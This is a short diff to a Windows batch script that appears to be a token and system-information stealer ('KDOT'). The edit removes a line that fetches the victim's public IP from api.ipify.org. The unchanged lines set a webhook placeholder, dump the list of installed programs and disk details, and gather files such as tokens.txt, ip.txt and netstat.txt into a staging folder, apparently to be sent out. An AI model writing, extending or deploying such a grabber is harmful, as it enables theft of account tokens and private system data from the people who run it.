@@ -1,6 +1,5 @@
 @echo off
 set webhook=YOUR_WEBHOOK_HERE
-curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -60,7 +59,6 @@ mkdir %localappdata%\Temp\KDOT
 echo penis > %localappdata%\Temp\KDOT\KDot.txt
 move %userprofile%\AppData\Local\Temp\tokens.txt %userprofile%\AppData\Local\Temp\KDOT\tokens.txt
 move %localappdata%\Temp\ip.txt %localappdata%\Temp\KDOT\ip.txt
-move %localappdata%\Temp\ipp.txt  %localappdata%\Temp\KDOT\ipp.txt
 move %localappdata%\Temp\sysi.txt %localappdata%\Temp\KDOT\sysi.txt
 move %localappdata%\Temp\System_INFO.txt %localappdata%\Temp\KDOT\System_INFO.txt
 move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
